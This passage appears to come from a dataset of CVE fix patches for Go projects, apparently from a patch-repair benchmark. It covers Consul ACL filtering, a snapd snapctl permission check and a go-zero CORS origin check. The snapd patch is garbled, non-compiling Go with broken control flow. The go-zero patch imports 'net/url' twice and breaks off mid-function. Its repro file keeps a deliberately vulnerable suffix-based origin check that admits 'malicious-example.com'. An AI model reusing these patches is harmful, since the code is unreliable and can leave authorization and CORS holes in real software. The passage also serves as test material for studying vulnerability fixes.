n[i].FillAuthzContext(&authzContext)\n+                node := n[i].Node\n+                if f.allowNode(node, &authzContext) {\n+                        continue\n+                }\n+                f.logger.Debug(\"dropping node from result due to ACLs\", \"node\", structs.NodeNameString(node, n[i].GetEnterpriseMeta()))\n+                removed = true\n+                n = append(n[:i], n[i+1:]...)\n+                i--\n+        }\n+        *nodes = n\n+        return removed\n }\n \n // redactPreparedQueryTokens will redact any tokens unless the client has a\n@@ -545,27 +567,27 @@ func (f *Filter) filterNodes(nodes *structs.Nodes) bool {\n // have the limitation of preventing delegated non-management users from seeing\n // captured tokens, but they can at least see whether or not a token is set.\n func (f *Filter) redactPreparedQueryTokens(query **structs.PreparedQuery) {\n-\t// Management tokens can see everything with no filtering.\n-\tvar authzContext acl.AuthorizerContext\n-\tstructs.DefaultEnterpriseMetaInDefaultPartition().FillAuthzContext(&authzContext)\n-\tif f.authorizer.ACLWrite(&authzContext) == acl.Allow {\n-\t\treturn\n-\t}\n-\n-\t// Let the user see if there's a blank token, otherwise we need\n-\t// to redact it, since we know they don't have a management\n-\t// token.\n-\tif (*query).Token != \"\" {\n-\t\t// Redact the token, using a copy of the query structure\n-\t\t// since we could be pointed at a live instance from the\n-\t\t// state store so it's not safe to modify it. Note that\n-\t\t// this clone will still point to things like underlying\n-\t\t// arrays in the original, but for modifying just the\n-\t\t// token it will be safe to use.\n-\t\tclone := *(*query)\n-\t\tclone.Token = RedactedToken\n-\t\t*query = &clone\n-\t}\n+        // Management tokens can see everything with no filtering.\n+        var authzContext acl.AuthorizerContext\n+        structs.DefaultEnterpriseMetaInDefaultPartition().FillAuthzContext(&authzContext)\n+        if f.authorizer.ACLWrite(&authzContext) == acl.Allow {\n+                return\n+        }\n+\n+        // Let the user see if there's a blank token, otherwise we need\n+        // to redact it, since we know they don't have a management\n+        // token.\n+        if (*query).Token != \"\" {\n+                // Redact the token, using a copy of the query structure\n+                // since we could be pointed at a live instance from the\n+                // state store so it's not safe to modify it. Note that\n+                // this clone will still point to things like underlying\n+                // arrays in the original, but for modifying just the\n+                // token it will be safe to use.\n+                clone := *(*query)\n+                clone.Token = RedactedToken\n+                *query = &clone\n+        }\n }\n \n // filterPreparedQueries is used to filter prepared queries based on ACL rules.\n@@ -574,248 +596,248 @@ func (f *Filter) redactPreparedQueryTokens(query **structs.PreparedQuery) {\n // queries were removed - un-named queries are meant to be ephemeral and can\n // only be enumerated by a management token\n func (f *Filter) filterPreparedQueries(queries *structs.PreparedQueries) bool {\n-\tvar authzContext acl.AuthorizerContext\n-\tstructs.DefaultEnterpriseMetaInDefaultPartition().FillAuthzContext(&authzContext)\n-\t// Management tokens can see everything with no filtering.\n-\t// TODO  is this check even necessary - this looks like a search replace from\n-\t// the 1.4 ACL rewrite. The global-management token will provide unrestricted query privileges\n-\t// so asking for ACLWrite should be unnecessary.\n-\tif f.authorizer.ACLWrite(&authzContext) == acl.Allow {\n-\t\treturn false\n-\t}\n-\n-\t// Otherwise, we need to see what the token has access to.\n-\tvar namedQueriesRemoved bool\n-\tret := make(structs.PreparedQueries, 0, len(*queries))\n-\tfor _, query := range *queries {\n-\t\t// If no prefix ACL applies to this query then filter it, since\n-\t\t// we know at this point the user doesn't have a management\n-\t\t// token, otherwise see what the policy says.\n-\t\tprefix, hasName := query.GetACLPrefix()\n-\t\tswitch {\n-\t\tcase hasName && f.authorizer.PreparedQueryRead(prefix, &authzContext) != acl.Allow:\n-\t\t\tnamedQueriesRemoved = true\n-\t\t\tfallthrough\n-\t\tcase !hasName:\n-\t\t\tf.logger.Debug(\"dropping prepared query from result due to ACLs\", \"query\", query.ID)\n-\t\t\tcontinue\n-\t\t}\n-\n-\t\t// Redact any tokens if necessary. We make a copy of just the\n-\t\t// pointer so we don't mess with the caller's slice.\n-\t\tfinal := query\n-\t\tf.redactPreparedQueryTokens(&final)\n-\t\tret = append(ret, final)\n-\t}\n-\t*queries = ret\n-\treturn namedQueriesRemoved\n+        var authzContext acl.AuthorizerContext\n+        structs.DefaultEnterpriseMetaInDefaultPartition().FillAuthzContext(&authzContext)\n+        // Management tokens can see everything with no filtering.\n+        // TODO  is this check even necessary - this looks like a search replace from\n+        // the 1.4 ACL rewrite. The global-management token will provide unrestricted query privileges\n+        // so asking for ACLWrite should be unnecessary.\n+        if f.authorizer.ACLWrite(&authzContext) == acl.Allow {\n+                return false\n+        }\n+\n+        // Otherwise, we need to see what the token has access to.\n+        var namedQueriesRemoved bool\n+        ret := make(structs.PreparedQueries, 0, len(*queries))\n+        for _, query := range *queries {\n+                // If no prefix ACL applies to this query then filter it, since\n+                // we know at this point the user doesn't have a management\n+                // token, otherwise see what the policy says.\n+                prefix, hasName := query.GetACLPrefix()\n+                switch {\n+                case hasName && f.authorizer.PreparedQueryRead(prefix, &authzContext) != acl.Allow:\n+                        namedQueriesRemoved = true\n+                        fallthrough\n+                case !hasName:\n+                        f.logger.Debug(\"dropping prepared query from result due to ACLs\", \"query\", query.ID)\n+                        continue\n+                }\n+\n+                // Redact any tokens if necessary. We make a copy of just the\n+                // pointer so we don't mess with the caller's slice.\n+                final := query\n+                f.redactPreparedQueryTokens(&final)\n+                ret = append(ret, final)\n+        }\n+        *queries = ret\n+        return namedQueriesRemoved\n }\n \n func (f *Filter) filterToken(token **structs.ACLToken) {\n-\tvar entCtx acl.AuthorizerContext\n-\tif token == nil || *token == nil || f == nil {\n-\t\treturn\n-\t}\n+        var entCtx acl.AuthorizerContext\n+        if token == nil || *token == nil || f == nil {\n+                return\n+        }\n \n-\t(*token).FillAuthzContext(&entCtx)\n+        (*token).FillAuthzContext(&entCtx)\n \n-\tif f.authorizer.ACLRead(&entCtx) != acl.Allow {\n-\t\t// no permissions to read\n-\t\t*token = nil\n-\t} else if f.authorizer.ACLWrite(&entCtx) != acl.Allow {\n-\t\t// no write permissions - redact secret\n-\t\tclone := *(*token)\n-\t\tclone.SecretID = RedactedToken\n-\t\t*token = &clone\n-\t}\n+        if f.authorizer.ACLRead(&entCtx) != acl.Allow {\n+                // no permissions to read\n+                *token = nil\n+        } else if f.authorizer.ACLWrite(&entCtx) != acl.Allow {\n+                // no write permissions - redact secret\n+                clone := *(*token)\n+                clone.SecretID = RedactedToken\n+                *token = &clone\n+        }\n }\n \n func (f *Filter) filterTokens(tokens *structs.ACLTokens) {\n-\tret := make(structs.ACLTokens, 0, len(*tokens))\n-\tfor _, token := range *tokens {\n-\t\tfinal := token\n-\t\tf.filterToken(&final)\n-\t\tif final != nil {\n-\t\t\tret = append(ret, final)\n-\t\t}\n-\t}\n-\t*tokens = ret\n+        ret := make(structs.ACLTokens, 0, len(*tokens))\n+        for _, token := range *tokens {\n+                final := token\n+                f.filterToken(&final)\n+                if final != nil {\n+                        ret = append(ret, final)\n+                }\n+        }\n+        *tokens = ret\n }\n \n func (f *Filter) filterTokenStub(token **structs.ACLTokenListStub) {\n-\tvar entCtx acl.AuthorizerContext\n-\tif token == nil || *token == nil || f == nil {\n-\t\treturn\n-\t}\n+        var entCtx acl.AuthorizerContext\n+        if token == nil || *token == nil || f == nil {\n+                return\n+        }\n \n-\t(*token).FillAuthzContext(&entCtx)\n+        (*token).FillAuthzContext(&entCtx)\n \n-\tif f.authorizer.ACLRead(&entCtx) != acl.Allow {\n-\t\t*token = nil\n-\t} else if f.authorizer.ACLWrite(&entCtx) != acl.Allow {\n-\t\t// no write permissions - redact secret\n-\t\tclone := *(*token)\n-\t\tclone.SecretID = RedactedToken\n-\t\t*token = &clone\n-\t}\n+        if f.authorizer.ACLRead(&entCtx) != acl.Allow {\n+                *token = nil\n+        } else if f.authorizer.ACLWrite(&entCtx) != acl.Allow {\n+                // no write permissions - redact secret\n+                clone := *(*token)\n+                clone.SecretID = RedactedToken\n+                *token = &clone\n+        }\n }\n \n func (f *Filter) filterTokenStubs(tokens *[]*structs.ACLTokenListStub) {\n-\tret := make(structs.ACLTokenListStubs, 0, len(*tokens))\n-\tfor _, token := range *tokens {\n-\t\tfinal := token\n-\t\tf.filterTokenStub(&final)\n-\t\tif final != nil {\n-\t\t\tret = append(ret, final)\n-\t\t}\n-\t}\n-\t*tokens = ret\n+        ret := make(structs.ACLTokenListStubs, 0, len(*tokens))\n+        for _, token := range *tokens {\n+                final := token\n+                f.filterTokenStub(&final)\n+                if final != nil {\n+                        ret = append(ret, final)\n+                }\n+        }\n+        *tokens = ret\n }\n \n func (f *Filter) filterPolicy(policy **structs.ACLPolicy) {\n-\tvar entCtx acl.AuthorizerContext\n-\tif policy == nil || *policy == nil || f == nil {\n-\t\treturn\n-\t}\n+        var entCtx acl.AuthorizerContext\n+        if policy == nil || *policy == nil || f == nil {\n+                return\n+        }\n \n-\t(*policy).FillAuthzContext(&entCtx)\n+        (*policy).FillAuthzContext(&entCtx)\n \n-\tif f.authorizer.ACLRead(&entCtx) != acl.Allow {\n-\t\t// no permissions to read\n-\t\t*policy = nil\n-\t}\n+        if f.authorizer.ACLRead(&entCtx) != acl.Allow {\n+                // no permissions to read\n+                *policy = nil\n+        }\n }\n \n func (f *Filter) filterPolicies(policies *structs.ACLPolicies) {\n-\tret := make(structs.ACLPolicies, 0, len(*policies))\n-\tfor _, policy := range *policies {\n-\t\tfinal := policy\n-\t\tf.filterPolicy(&final)\n-\t\tif final != nil {\n-\t\t\tret = append(ret, final)\n-\t\t}\n-\t}\n-\t*policies = ret\n+        ret := make(structs.ACLPolicies, 0, len(*policies))\n+        for _, policy := range *policies {\n+                final := policy\n+                f.filterPolicy(&final)\n+                if final != nil {\n+                        ret = append(ret, final)\n+                }\n+        }\n+        *policies = ret\n }\n \n func (f *Filter) filterRole(role **structs.ACLRole) {\n-\tvar entCtx acl.AuthorizerContext\n-\tif role == nil || *role == nil || f == nil {\n-\t\treturn\n-\t}\n+        var entCtx acl.AuthorizerContext\n+        if role == nil || *role == nil || f == nil {\n+                return\n+        }\n \n-\t(*role).FillAuthzContext(&entCtx)\n+        (*role).FillAuthzContext(&entCtx)\n \n-\tif f.authorizer.ACLRead(&entCtx) != acl.Allow {\n-\t\t// no permissions to read\n-\t\t*role = nil\n-\t}\n+        if f.authorizer.ACLRead(&entCtx) != acl.Allow {\n+                // no permissions to read\n+                *role = nil\n+        }\n }\n \n func (f *Filter) filterRoles(roles *structs.ACLRoles) {\n-\tret := make(structs.ACLRoles, 0, len(*roles))\n-\tfor _, role := range *roles {\n-\t\tfinal := role\n-\t\tf.filterRole(&final)\n-\t\tif final != nil {\n-\t\t\tret = append(ret, final)\n-\t\t}\n-\t}\n-\t*roles = ret\n+        ret := make(structs.ACLRoles, 0, len(*roles))\n+        for _, role := range *roles {\n+                final := role\n+                f.filterRole(&final)\n+                if final != nil {\n+                        ret = append(ret, final)\n+                }\n+        }\n+        *roles = ret\n }\n \n func (f *Filter) filterBindingRule(rule **structs.ACLBindingRule) {\n-\tvar entCtx acl.AuthorizerContext\n-\tif rule == nil || *rule == nil || f == nil {\n-\t\treturn\n-\t}\n+        var entCtx acl.AuthorizerContext\n+        if rule == nil || *rule == nil || f == nil {\n+                return\n+        }\n \n-\t(*rule).FillAuthzContext(&entCtx)\n+        (*rule).FillAuthzContext(&entCtx)\n \n-\tif f.authorizer.ACLRead(&entCtx) != acl.Allow {\n-\t\t// no permissions to read\n-\t\t*rule = nil\n-\t}\n+        if f.authorizer.ACLRead(&entCtx) != acl.Allow {\n+                // no permissions to read\n+                *rule = nil\n+        }\n }\n \n func (f *Filter) filterBindingRules(rules *structs.ACLBindingRules) {\n-\tret := make(structs.ACLBindingRules, 0, len(*rules))\n-\tfor _, rule := range *rules {\n-\t\tfinal := rule\n-\t\tf.filterBindingRule(&final)\n-\t\tif final != nil {\n-\t\t\tret = append(ret, final)\n-\t\t}\n-\t}\n-\t*rules = ret\n+        ret := make(structs.ACLBindingRules, 0, len(*rules))\n+        for _, rule := range *rules {\n+                final := rule\n+                f.filterBindingRule(&final)\n+                if final != nil {\n+                        ret = append(ret, final)\n+                }\n+        }\n+        *rules = ret\n }\n \n func (f *Filter) filterAuthMethod(method **structs.ACLAuthMethod) {\n-\tvar entCtx acl.AuthorizerContext\n-\tif method == nil || *method == nil || f == nil {\n-\t\treturn\n-\t}\n+        var entCtx acl.AuthorizerContext\n+        if method == nil || *method == nil || f == nil {\n+                return\n+        }\n \n-\t(*method).FillAuthzContext(&entCtx)\n+        (*method).FillAuthzContext(&entCtx)\n \n-\tif f.authorizer.ACLRead(&entCtx) != acl.Allow {\n-\t\t// no permissions to read\n-\t\t*method = nil\n-\t}\n+        if f.authorizer.ACLRead(&entCtx) != acl.Allow {\n+                // no permissions to read\n+                *method = nil\n+        }\n }\n \n func (f *Filter) filterAuthMethods(methods *structs.ACLAuthMethods) {\n-\tret := make(structs.ACLAuthMethods, 0, len(*methods))\n-\tfor _, method := range *methods {\n-\t\tfinal := method\n-\t\tf.filterAuthMethod(&final)\n-\t\tif final != nil {\n-\t\t\tret = append(ret, final)\n-\t\t}\n-\t}\n-\t*methods = ret\n+        ret := make(structs.ACLAuthMethods, 0, len(*methods))\n+        for _, method := range *methods {\n+                final := method\n+                f.filterAuthMethod(&final)\n+                if final != nil {\n+                        ret = append(ret, final)\n+                }\n+        }\n+        *methods = ret\n }\n \n func (f *Filter) filterServiceList(services *structs.ServiceList) bool {\n-\tret := make(structs.ServiceList, 0, len(*services))\n-\tvar removed bool\n-\tfor _, svc := range *services {\n-\t\tvar authzContext acl.AuthorizerContext\n+        ret := make(structs.ServiceList, 0, len(*services))\n+        var removed bool\n+        for _, svc := range *services {\n+                var authzContext acl.AuthorizerContext\n \n-\t\tsvc.FillAuthzContext(&authzContext)\n+                svc.FillAuthzContext(&authzContext)\n \n-\t\tif f.authorizer.ServiceRead(svc.Name, &authzContext) != acl.Allow {\n-\t\t\tremoved = true\n-\t\t\tsid := structs.NewServiceID(svc.Name, &svc.EnterpriseMeta)\n-\t\t\tf.logger.Debug(\"dropping service from result due to ACLs\", \"service\", sid.String())\n-\t\t\tcontinue\n-\t\t}\n+                if f.authorizer.ServiceRead(svc.Name, &authzContext) != acl.Allow {\n+                        removed = true\n+                        sid := structs.NewServiceID(svc.Name, &svc.EnterpriseMeta)\n+                        f.logger.Debug(\"dropping service from result due to ACLs\", \"service\", sid.String())\n+                        continue\n+                }\n \n-\t\tret = append(ret, svc)\n-\t}\n+                ret = append(ret, svc)\n+        }\n \n-\t*services = ret\n-\treturn removed\n+        *services = ret\n+        return removed\n }\n \n // filterGatewayServices is used to filter gateway to service mappings based on ACL rules.\n // Returns true if any elements were removed.\n func (f *Filter) filterGatewayServices(mappings *structs.GatewayServices) bool {\n-\tret := make(structs.GatewayServices, 0, len(*mappings))\n-\tvar removed bool\n-\tfor _, s := range *mappings {\n-\t\t// This filter only checks ServiceRead on the linked service.\n-\t\t// ServiceRead on the gateway is checked in the GatewayServices endpoint before filtering.\n-\t\tvar authzContext acl.AuthorizerContext\n-\t\ts.Service.FillAuthzContext(&authzContext)\n-\n-\t\tif f.authorizer.ServiceRead(s.Service.Name, &authzContext) != acl.Allow {\n-\t\t\tf.logger.Debug(\"dropping service from result due to ACLs\", \"service\", s.Service.String())\n-\t\t\tremoved = true\n-\t\t\tcontinue\n-\t\t}\n-\t\tret = append(ret, s)\n-\t}\n-\t*mappings = ret\n-\treturn removed\n+        ret := make(structs.GatewayServices, 0, len(*mappings))\n+        var removed bool\n+        for _, s := range *mappings {\n+                // This filter only checks ServiceRead on the linked service.\n+                // ServiceRead on the gateway is checked in the GatewayServices endpoint before filtering.\n+                var authzContext acl.AuthorizerContext\n+                s.Service.FillAuthzContext(&authzContext)\n+\n+                if f.authorizer.ServiceRead(s.Service.Name, &authzContext) != acl.Allow {\n+                        f.logger.Debug(\"dropping service from result due to ACLs\", \"service\", s.Service.String())\n+                        removed = true\n+                        continue\n+                }\n+                ret = append(ret, s)\n+        }\n+        *mappings = ret\n+        return removed\n }\n"}
{"cve":"CVE-2024-5138:0708", "fix_patch": "diff --git a/overlord/hookstate/ctlcmd/ctlcmd.go b/overlord/hookstate/ctlcmd/ctlcmd.go\nindex b663420a3f..edacc48a33 100644\n--- a/overlord/hookstate/ctlcmd/ctlcmd.go\n+++ b/overlord/hookstate/ctlcmd/ctlcmd.go\n@@ -21,125 +21,125 @@\n package ctlcmd\n \n import (\n-\t\"bytes\"\n-\t\"fmt\"\n-\t\"io\"\n-\t\"strconv\"\n+        \"bytes\"\n+        \"fmt\"\n+        \"io\"\n+        \"strconv\"\n \n-\t\"github.com/jessevdk/go-flags\"\n+        \"github.com/jessevdk/go-flags\"\n \n-\t\"github.com/snapcore/snapd/logger\"\n-\t\"github.com/snapcore/snapd/overlord/hookstate\"\n-\t\"github.com/snapcore/snapd/strutil\"\n+        \"github.com/snapcore/snapd/logger\"\n+        \"github.com/snapcore/snapd/overlord/hookstate\"\n+        \"github.com/snapcore/snapd/strutil\"\n )\n \n type MissingContextError struct {\n-\tsubcommand string\n+        subcommand string\n }\n \n func (e *MissingContextError) Error() string {\n-\treturn fmt.Sprintf(`cannot invoke snapctl operation commands (here %q) from outside of a snap`, e.subcommand)\n+        return fmt.Sprintf(`cannot invoke snapctl operation commands (here %q) from outside of a snap`, e.subcommand)\n }\n \n type baseCommand struct {\n-\tstdout io.Writer\n-\tstderr io.Writer\n-\tc      *hookstate.Context\n-\tname   string\n-\tuid    string\n+        stdout io.Writer\n+        stderr io.Writer\n+        c      *hookstate.Context\n+        name   string\n+        uid    string\n }\n \n func (c *baseCommand) setName(name string) {\n-\tc.name = name\n+        c.name = name\n }\n \n func (c *baseCommand) setUid(uid uint32) {\n-\tc.uid = strconv.FormatUint(uint64(uid), 10)\n+        c.uid = strconv.FormatUint(uint64(uid), 10)\n }\n \n func (c *baseCommand) setStdout(w io.Writer) {\n-\tc.stdout = w\n+        c.stdout = w\n }\n \n func (c *baseCommand) printf(format string, a ...interface{}) {\n-\tif c.stdout != nil {\n-\t\tfmt.Fprintf(c.stdout, format, a...)\n-\t}\n+        if c.stdout != nil {\n+                fmt.Fprintf(c.stdout, format, a...)\n+        }\n }\n \n func (c *baseCommand) setStderr(w io.Writer) {\n-\tc.stderr = w\n+        c.stderr = w\n }\n \n func (c *baseCommand) errorf(format string, a ...interface{}) {\n-\tif c.stderr != nil {\n-\t\tfmt.Fprintf(c.stderr, format, a...)\n-\t}\n+        if c.stderr != nil {\n+                fmt.Fprintf(c.stderr, format, a...)\n+        }\n }\n \n func (c *baseCommand) setContext(context *hookstate.Context) {\n-\tc.c = context\n+        c.c = context\n }\n \n func (c *baseCommand) context() *hookstate.Context {\n-\treturn c.c\n+        return c.c\n }\n \n func (c *baseCommand) ensureContext() (context *hookstate.Context, err error) {\n-\tif c.c == nil {\n-\t\terr = &MissingContextError{c.name}\n-\t}\n-\treturn c.c, err\n+        if c.c == nil {\n+                err = &MissingContextError{c.name}\n+        }\n+        return c.c, err\n }\n \n type command interface {\n-\tsetName(name string)\n-\tsetUid(uid uint32)\n+        setName(name string)\n+        setUid(uid uint32)\n \n-\tsetStdout(w io.Writer)\n-\tsetStderr(w io.Writer)\n+        setStdout(w io.Writer)\n+        setStderr(w io.Writer)\n \n-\tsetContext(context *hookstate.Context)\n-\tcontext() *hookstate.Context\n+        setContext(context *hookstate.Context)\n+        context() *hookstate.Context\n \n-\tExecute(args []string) error\n+        Execute(args []string) error\n }\n \n type commandInfo struct {\n-\tshortHelp string\n-\tlongHelp  string\n-\tgenerator func() command\n-\thidden    bool\n+        shortHelp string\n+        longHelp  string\n+        generator func() command\n+        hidden    bool\n }\n \n var commands = make(map[string]*commandInfo)\n \n func addCommand(name, shortHelp, longHelp string, generator func() command) *commandInfo {\n-\tcmd := &commandInfo{\n-\t\tshortHelp: shortHelp,\n-\t\tlongHelp:  longHelp,\n-\t\tgenerator: generator,\n-\t}\n-\tcommands[name] = cmd\n-\treturn cmd\n+        cmd := &commandInfo{\n+                shortHelp: shortHelp,\n+                longHelp:  longHelp,\n+                generator: generator,\n+        }\n+        commands[name] = cmd\n+        return cmd\n }\n \n // UnsuccessfulError carries a specific exit code to be returned to the client.\n type UnsuccessfulError struct {\n-\tExitCode int\n+        ExitCode int\n }\n \n func (e UnsuccessfulError) Error() string {\n-\treturn fmt.Sprintf(\"unsuccessful with exit code: %d\", e.ExitCode)\n+        return fmt.Sprintf(\"unsuccessful with exit code: %d\", e.ExitCode)\n }\n \n // ForbiddenCommandError conveys that a command cannot be invoked in some context\n type ForbiddenCommandError struct {\n-\tMessage string\n+        Message string\n }\n \n func (f ForbiddenCommandError) Error() string {\n-\treturn f.Message\n+        return f.Message\n }\n \n // nonRootAllowed lists the commands that can be performed even when snapctl\n@@ -148,46 +148,56 @@ var nonRootAllowed = []string{\"get\", \"services\", \"set-health\", \"is-connected\", \"\n \n // Run runs the requested command.\n func Run(context *hookstate.Context, args []string, uid uint32) (stdout, stderr []byte, err error) {\n-\tif len(args) == 0 {\n-\t\treturn nil, nil, fmt.Errorf(\"internal error: snapctl cannot run without args\")\n-\t}\n-\n-\tif !isAllowedToRun(uid, args) {\n-\t\treturn nil, nil, &ForbiddenCommandError{Message: fmt.Sprintf(\"cannot use %q with uid %d, try with sudo\", args[0], uid)}\n-\t}\n-\n-\tparser := flags.NewNamedParser(\"snapctl\", flags.PassDoubleDash|flags.HelpFlag)\n-\n-\t// Create stdout/stderr buffers, and make sure commands use them.\n-\tvar stdoutBuffer bytes.Buffer\n-\tvar stderrBuffer bytes.Buffer\n-\tfor name, cmdInfo := range commands {\n-\t\tcmd := cmdInfo.generator()\n-\t\tcmd.setName(name)\n-\t\tcmd.setUid(uid)\n-\t\tcmd.setStdout(&stdoutBuffer)\n-\t\tcmd.setStderr(&stderrBuffer)\n-\t\tcmd.setContext(context)\n-\n-\t\ttheCmd, err := parser.AddCommand(name, cmdInfo.shortHelp, cmdInfo.longHelp, cmd)\n-\t\ttheCmd.Hidden = cmdInfo.hidden\n-\t\tif err != nil {\n-\t\t\tlogger.Panicf(\"cannot add command %q: %s\", name, err)\n-\t\t}\n-\t}\n-\n-\t_, err = parser.ParseArgs(args)\n-\treturn stdoutBuffer.Bytes(), stderrBuffer.Bytes(), err\n+        if len(args) == 0 {\n+                return nil, nil, fmt.Errorf(\"internal error: snapctl cannot run without args\")\n+        }\n+\n+        if !isAllowedToRun(uid, args) {\n+                return nil, nil, &ForbiddenCommandError{Message: fmt.Sprintf(\"cannot use %q with uid %d, try with sudo\", args[0], uid)}\n+        }\n+\n+        parser := flags.NewNamedParser(\"snapctl\", flags.PassDoubleDash|flags.HelpFlag)\n+\n+        // Create stdout/stderr buffers, and make sure commands use them.\n+        var stdoutBuffer bytes.Buffer\n+        var stderrBuffer bytes.Buffer\n+        for name, cmdInfo := range commands {\n+                cmd := cmdInfo.generator()\n+                cmd.setName(name)\n+                cmd.setUid(uid)\n+                cmd.setStdout(&stdoutBuffer)\n+                cmd.setStderr(&stderrBuffer)\n+                cmd.setContext(context)\n+\n+                theCmd, err := parser.AddCommand(name, cmdInfo.shortHelp, cmdInfo.longHelp, cmd)\n+                theCmd.Hidden = cmdInfo.hidden\n+                if err != nil {\n+                        logger.Panicf(\"cannot add command %q: %s\", name, err)\n+                }\n+        }\n+\n+        _, err = parser.ParseArgs(args)\n+        return stdoutBuffer.Bytes(), stderrBuffer.Bytes(), err\n }\n \n func isAllowedToRun(uid uint32, args []string) bool {\n-\t// A command can run if any of the following are true:\n-\t//\t* It runs as root\n-\t//\t* It's contained in nonRootAllowed\n-\t//\t* It's used with the -h or --help flags\n-\t// note: commands still need valid context and snaps can only access own config.\n-\treturn uid == 0 ||\n-\t\tstrutil.ListContains(nonRootAllowed, args[0]) ||\n-\t\tstrutil.ListContains(args, \"-h\") ||\n-\t\tstrutil.ListContains(args, \"--help\")\n-}\n+// A command can run if any of the following are true:\n+//      * It runs as root\n+//      * It's contained in nonRootAllowed\n+// note: commands still need valid context and snaps can only access own config.\n+if uid == 0 || (len(args) > 0 && strutil.ListContains(nonRootAllowed, args[0])) {\n+ true\n+}\n+\n+// It's also allowed to ask for help, which go-flags will then handle.\n+// We need to be careful to not allow this to be used to actually run\n+// a privileged command, so we only check against a hardcoded list of\n+// help flags that are handled by go-flags.\n+// N.B. we check for --help *first* since go-flags does partial matching\n+// of long options, so we want to be sure that we only match --help, and\n+// not e.g. --healthy.\n+for _, arg := range args {\n+arg == \"--help\" || arg == \"-h\" {\n+ true\n+ false\n+}\n\\ No newline at end of file\n"}
{"cve":"CVE-2024-27302:0708", "fix_patch": "diff --git a/repro.go b/repro.go\nnew file mode 100644\nindex 00000000..ed458d5c\n--- /dev/null\n+++ b/repro.go\n@@ -0,0 +1,56 @@\n+package main\n+\n+import (\n+\"fmt\"\n+\"net/url\"\n+\"strings\"\n+)\n+\n+func isOriginAllowedVulnerable(allows []string, origin string) bool {\n+for _, o := range allows {\n+if o == \"*\" {\n+return true\n+}\n+if strings.HasSuffix(origin, o) {\n+return true\n+}\n+}\n+return false\n+}\n+\n+func isOriginAllowedFixed(allows []string, origin string) bool {\n+u, err := url.Parse(origin)\n+if err != nil {\n+return false\n+}\n+\n+host := u.Hostname()\n+for _, o := range allows {\n+if o == \"*\" {\n+return true\n+}\n+\n+if host == o {\n+return true\n+}\n+\n+if strings.HasSuffix(host, \".\"+o) {\n+return true\n+}\n+}\n+\n+return false\n+}\n+\n+func main() {\n+allowed := []string{\"example.com\"}\n+fmt.Println(\"Vulnerable implementation:\")\n+fmt.Printf(\"allowed: %v, origin: %s, allowed: %v\\n\", allowed, \"https://malicious-example.com\", isOriginAllowedVulnerable(allowed, \"https://malicious-example.com\"))\n+fmt.Printf(\"allowed: %v, origin: %s, allowed: %v\\n\", allowed, \"https://example.com\", isOriginAllowedVulnerable(allowed, \"https://example.com\"))\n+fmt.Printf(\"allowed: %v, origin: %s, allowed: %v\\n\", allowed, \"https://sub.example.com\", isOriginAllowedVulnerable(allowed, \"https://sub.example.com\"))\n+\n+fmt.Println(\"\\nFixed implementation:\")\n+fmt.Printf(\"allowed: %v, origin: %s, allowed: %v\\n\", allowed, \"https://malicious-example.com\", isOriginAllowedFixed(allowed, \"https://malicious-example.com\"))\n+fmt.Printf(\"allowed: %v, origin: %s, allowed: %v\\n\", allowed, \"https://example.com\", isOriginAllowedFixed(allowed, \"https://example.com\"))\n+fmt.Printf(\"allowed: %v, origin: %s, allowed: %v\\n\", allowed, \"https://sub.example.com\", isOriginAllowedFixed(allowed, \"https://sub.example.com\"))\n+}\ndiff --git a/rest/internal/cors/handlers.go b/rest/internal/cors/handlers.go\nindex e2a64b74..58505ae6 100644\n--- a/rest/internal/cors/handlers.go\n+++ b/rest/internal/cors/handlers.go\n@@ -1,112 +1,128 @@\n package cors\n \n import (\n-\t\"net/http\"\n-\t\"strings\"\n+\"net/http\"\n+\"net/url\"\n+\"net/url\"\n+\"strings\"\n \n-\t\"github.com/zeromicro/go-zero/rest/internal/response\"\n+\"github.com/zeromicro/go-zero/rest/internal/response\"\n )\n \n const (\n-\tallowOrigin      = \"Access-Control-Allow-Origin\"\n-\tallOrigins       = \"*\"\n-\tallowMethods     = \"Access-Control-Allow-Methods\"\n-\tallowHeaders     = \"Access-Control-Allow-Headers\"\n-\tallowCredentials = \"Access-Control-Allow-Credentials\"\n-\texposeHeaders    = \"Access-Control-Expose-Headers\"\n-\trequestMethod    = \"Access-Control-Request-Method\"\n-\trequestHeaders   = \"Access-Control-Request-Headers\"\n-\tallowHeadersVal  = \"Content-Type, Origin, X-CSRF-Token, Authorization, AccessToken, Token, Range\"\n-\texposeHeadersVal = \"Content-Length, Access-Control-Allow-Origin, Access-Control-Allow-Headers\"\n-\tmethods          = \"GET, HEAD, POST, PATCH, PUT, DELETE\"\n-\tallowTrue        = \"true\"\n-\tmaxAgeHeader     = \"Access-Control-Max-Age\"\n-\tmaxAgeHeaderVal  = \"86400\"\n-\tvaryHeader       = \"Vary\"\n-\toriginHeader     = \"Origin\"\n+allowOrigin      = \"Access-Control-Allow-Origin\"\n+allOrigins       = \"*\"\n+allowMethods     = \"Access-Control-Allow-Methods\"\n+allowHeaders     = \"Access-Control-Allow-Headers\"\n+allowCredentials = \"Access-Control-Allow-Credentials\"\n+exposeHeaders    = \"Access-Control-Expose-Headers\"\n+requestMethod    = \"Access-Control-Request-Method\"\n+requestHeaders   = \"Access-Control-Request-Headers\"\n+allowHeadersVal  = \"Content-Type, Origin, X-CSRF-Token, Authorization, AccessToken, Token, Range\"\n+exposeHeadersVal = \"Content-Length, Access-Control-Allow-Origin, Access-Control-Allow-Headers\"\n+methods          = \"GET, HEAD, POST, PATCH, PUT, DELETE\"\n+allowTrue        = \"true\"\n+maxAgeHeader     = \"Access-Control-Max-Age\"\n+maxAgeHeaderVal  = \"86400\"\n+varyHeader       = \"Vary\"\n+originHeader     = \"Origin\"\n )\n \n // NotAllowedHandler handles cross domain not allowed requests.\n // At most one origin can be specified, other origins are ignored if given, default to be *.\n func NotAllowedHandler(fn func(w http.ResponseWriter), origins ...string) http.Handler {\n-\treturn http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {\n-\t\tgw := response.NewHeaderOnceResponseWriter(w)\n-\t\tcheckAndSetHeaders(gw, r, origins)\n-\t\tif fn != nil {\n-\t\t\tfn(gw)\n-\t\t}\n+return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {\n+gw := response.NewHeaderOnceResponseWriter(w)\n+checkAndSetHeaders(gw, r, origins)\n+if fn != nil {\n+fn(gw)\n+}\n \n-\t\tif r.Method == http.MethodOptions {\n-\t\t\tgw.WriteHeader(http.StatusNoContent)\n-\t\t} else {\n-\t\t\tgw.WriteHeader(http.StatusNotFound)\n-\t\t}\n-\t})\n+if r.Method == http.MethodOptions 